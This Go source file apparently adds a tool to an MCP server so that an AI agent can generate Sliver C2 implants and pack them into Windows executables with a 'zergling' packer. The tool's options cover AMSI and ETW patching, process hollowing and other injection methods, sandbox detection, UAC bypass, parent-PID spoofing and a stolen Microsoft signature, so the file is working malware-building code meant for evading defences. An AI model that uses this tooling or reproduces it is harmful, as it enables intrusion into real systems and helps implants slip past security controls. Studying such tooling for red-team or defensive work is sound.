package mcp

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	mcpapi "github.com/mark3labs/mcp-go/mcp"
)

const (
	generatePackedImplantToolName = "generate_zergling_implant"
)

type zerglingEvasion struct {
	CheckResources  bool `json:"check_resources"`
	UserInteraction bool `json:"user_interaction"`
	Numa            bool `json:"numa"`
	Noaccess        bool `json:"noaccess"`
}

type zerglingUAC struct {
	Enabled bool   `json:"enabled"`
	Method  string `json:"method"`
}

type zerglingShellcode struct {
	Source string `json:"source"`
	File   string `json:"file"`
}

type zerglingPost struct {
	UPX  bool `json:"upx"`
	Sign bool `json:"sign"`
}

type zerglingTarget struct {
	Path    string `json:"path,omitempty"`
	Process string `json:"process,omitempty"`
}

type zerglingPersist struct {
	Method string `json:"method,omitempty"`
	Name   string `json:"name,omitempty"`
	Path   string `json:"path,omitempty"`
}

type zerglingManifest struct {
	Method           string            `json:"method"`
	SyscallsIndirect bool              `json:"syscalls_indirect"`
	ETWPatch         bool              `json:"etw_patch"`
	AMSIPatch        bool              `json:"amsi_patch"`
	SleepMask        bool              `json:"sleep_mask"`
	PPIDSpoof        bool              `json:"ppid_spoof"`
	Debug            bool              `json:"debug"`
	Evasion          zerglingEvasion   `json:"evasion"`
	UAC              zerglingUAC       `json:"uac"`
	Target           zerglingTarget    `json:"target"`
	Persist          zerglingPersist   `json:"persist"`
	Shellcode        zerglingShellcode `json:"shellcode"`
	Post             zerglingPost      `json:"post"`
	Output           string            `json:"output"`
}

type generatePackedImplantArgs struct {
	Name             string   `json:"name" jsonschema:"description=Name for the implant"`
	OS               string   `json:"os" jsonschema:"description=Target OS (windows/linux/darwin),required"`
	Arch             string   `json:"arch" jsonschema:"description=Target architecture (amd64/386/arm64),required"`
	IsBeacon         bool     `json:"is_beacon" jsonschema:"description=Generate as beacon"`
	BeaconInterval   int64    `json:"beacon_interval" jsonschema:"description=Beacon interval in nanoseconds"`
	BeaconJitter     int64    `json:"beacon_jitter" jsonschema:"description=Beacon jitter in nanoseconds"`
	C2URLs           []string `json:"c2_urls" jsonschema:"description=C2 URLs,required"`
	Format           int32    `json:"format" jsonschema:"description=Output format"`
	Debug            bool     `json:"debug" jsonschema:"description=Debug mode"`
	Evasion          bool     `json:"evasion" jsonschema:"description=Evasion features"`
	ObfuscateSymbols bool     `json:"obfuscate_symbols" jsonschema:"description=Obfuscate symbols"`
	IncludeMTLS      bool     `json:"include_mtls" jsonschema:"description=Include mTLS transport"`
	IncludeHTTP      bool     `json:"include_http" jsonschema:"description=Include HTTP transport"`
	IncludeWG        bool     `json:"include_wg" jsonschema:"description=Include WireGuard transport"`
	IncludeDNS       bool     `json:"include_dns" jsonschema:"description=Include DNS transport"`

	// Injection method
	Method string `json:"method" jsonschema:"description=Injection method. Local (same-process): create_thread (default) create_fiber memmap etw_thread apc_local. Remote (new process - survives loader exit): early_bird remote_thread rtl_user_thread process_hollow module_stomp. Local methods die if the loader exits; remote methods inject into a child process and survive."`

	// Core evasion
	SyscallsIndirect bool `json:"syscalls_indirect" jsonschema:"description=Use indirect syscalls via dynamic SSN resolution (recommended always)"`
	ETWPatch         bool `json:"etw_patch" jsonschema:"description=Patch EtwEventWrite in current process"`
	AMSIPatch        bool `json:"amsi_patch" jsonschema:"description=Patch AmsiScanBuffer + AmsiScanString"`
	SleepMask        bool `json:"sleep_mask" jsonschema:"description=ChaCha20-encrypt shellcode region during beacon sleep (requires syscalls_indirect)"`
	PPIDSpoof        bool `json:"ppid_spoof" jsonschema:"description=Spoof parent PID (default: explorer.exe) for remote injection methods"`

	// Sandbox evasion
	EvasionNoaccess        bool `json:"evasion_noaccess" jsonschema:"description=PAGE_NOACCESS timing dwell before shellcode execution"`
	EvasionResources       bool `json:"evasion_resources" jsonschema:"description=Check resource count to detect sandbox (may fail on low-resource VMs)"`
	EvasionUserInteraction bool `json:"evasion_user_interaction" jsonschema:"description=Check for user interaction (mouse/keyboard) to detect sandbox"`
	EvasionNuma            bool `json:"evasion_numa" jsonschema:"description=NUMA node check to detect sandbox"`

	// UAC bypass
	UACEnabled bool   `json:"uac_enabled" jsonschema:"description=Enable self-elevating UAC bypass"`
	UACMethod  string `json:"uac_method" jsonschema:"description=UAC bypass method (auto/fodhelper/cmstplua/etc). Default: auto"`

	// Target process (for remote injection methods)
	TargetPath    string `json:"target_path" jsonschema:"description=Target executable path for process_hollow (e.g. C:\\\\Windows\\\\System32\\\\svchost.exe)"`
	TargetProcess string `json:"target_process" jsonschema:"description=Target process name for remote injection methods (e.g. explorer.exe)"`

	// Post-processing
	UPX  bool `json:"upx" jsonschema:"description=Compress output with UPX"`
	Sign bool `json:"sign" jsonschema:"description=Append stolen Microsoft Authenticode signature"`

	ManifestJSON string `json:"manifest_json" jsonschema:"description=Full zergling manifest JSON (overrides all individual fields if provided)"`
	OutputDir    string `json:"output_dir" jsonschema:"description=Directory to save output file (default /tmp)"`
}

func (s *SliverMCPServer) generatePackedImplantHandler(ctx context.Context, request mcpapi.CallToolRequest) (*mcpapi.CallToolResult, error) {
	if s.Rpc == nil {
		return mcpapi.NewToolResultError("rpc client not configured"), nil
	}

	if s.ZerglingPath == "" {
		return mcpapi.NewToolResultError("zergling packer path not configured"), nil
	}

	var args generatePackedImplantArgs
	if err := request.BindArguments(&args); err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("invalid arguments: %v", err)), nil
	}
	s.logToolCall(generatePackedImplantToolName, "", "")

	cfg := buildImplantConfig(args.OS, args.Arch, args.IsBeacon,
		args.BeaconInterval, args.BeaconJitter, args.C2URLs,
		args.Format, args.Debug, args.Evasion, args.ObfuscateSymbols,
		args.IncludeMTLS, args.IncludeHTTP, args.IncludeWG, args.IncludeDNS,
		"", 0, 0, "", "", "")

	genResp, err := s.Rpc.Generate(ctx, &clientpb.GenerateReq{
		Config: cfg,
		Name:   args.Name,
	})
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("implant generation failed", err), nil
	}
	if genResp.File == nil || len(genResp.File.Data) == 0 {
		return mcpapi.NewToolResultError("generation returned empty payload"), nil
	}

	scFile, err := os.CreateTemp("", "sliver-sc-*.bin")
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to create temp file", err), nil
	}
	scPath := scFile.Name()
	defer os.Remove(scPath)

	if _, err := scFile.Write(genResp.File.Data); err != nil {
		scFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to write shellcode", err), nil
	}
	scFile.Close()

	outDir := args.OutputDir
	if outDir == "" {
		outDir = os.TempDir()
	}
	outPath := filepath.Join(outDir, genResp.ImplantName+".exe")

	var manifest zerglingManifest
	if args.ManifestJSON != "" {
		if err := json.Unmarshal([]byte(args.ManifestJSON), &manifest); err != nil {
			return mcpapi.NewToolResultError(fmt.Sprintf("invalid manifest JSON: %v", err)), nil
		}
	} else {
		method := args.Method
		if method == "" {
			method = "create_thread"
		}
		uacMethod := args.UACMethod
		if uacMethod == "" {
			uacMethod = "auto"
		}
		manifest = zerglingManifest{
			Method:           method,
			SyscallsIndirect: args.SyscallsIndirect,
			ETWPatch:         args.ETWPatch,
			AMSIPatch:        args.AMSIPatch,
			SleepMask:        args.SleepMask,
			PPIDSpoof:        args.PPIDSpoof,
			Debug:            args.Debug,
			Evasion: zerglingEvasion{
				CheckResources:  args.EvasionResources,
				UserInteraction: args.EvasionUserInteraction,
				Numa:            args.EvasionNuma,
				Noaccess:        args.EvasionNoaccess,
			},
			UAC: zerglingUAC{
				Enabled: args.UACEnabled,
				Method:  uacMethod,
			},
			Target: zerglingTarget{
				Path:    args.TargetPath,
				Process: args.TargetProcess,
			},
			Post: zerglingPost{
				UPX:  args.UPX,
				Sign: args.Sign,
			},
		}
	}

	manifest.Shellcode = zerglingShellcode{
		Source: "file",
		File:   scPath,
	}
	manifest.Output = outPath

	manifestFile, err := os.CreateTemp("", "zergling-manifest-*.json")
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to create manifest file", err), nil
	}
	manifestPath := manifestFile.Name()
	defer os.Remove(manifestPath)

	manifestBytes, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		manifestFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to marshal manifest", err), nil
	}
	if _, err := manifestFile.Write(manifestBytes); err != nil {
		manifestFile.Close()
		return mcpapi.NewToolResultErrorFromErr("failed to write manifest", err), nil
	}
	manifestFile.Close()

	cmd := exec.CommandContext(ctx, s.ZerglingPath, "build", "-c", manifestPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return mcpapi.NewToolResultError(fmt.Sprintf("zergling build failed: %v\n%s", err, string(output))), nil
	}

	info, err := os.Stat(outPath)
	if err != nil {
		return mcpapi.NewToolResultErrorFromErr("failed to stat packed output", err), nil
	}

	type packedResult struct {
		ImplantName string `json:"implant_name"`
		Size        int    `json:"size"`
		PackedSize  int64  `json:"packed_size"`
		Method      string `json:"method"`
		BuildOutput string `json:"build_output"`
		OutputPath  string `json:"output_path"`
	}

	return mcpapi.NewToolResultStructuredOnly(packedResult{
		ImplantName: genResp.ImplantName,
		Size:        len(genResp.File.Data),
		PackedSize:  info.Size(),
		Method:      manifest.Method,
		BuildOutput: string(output),
		OutputPath:  outPath,
	}), nil
}
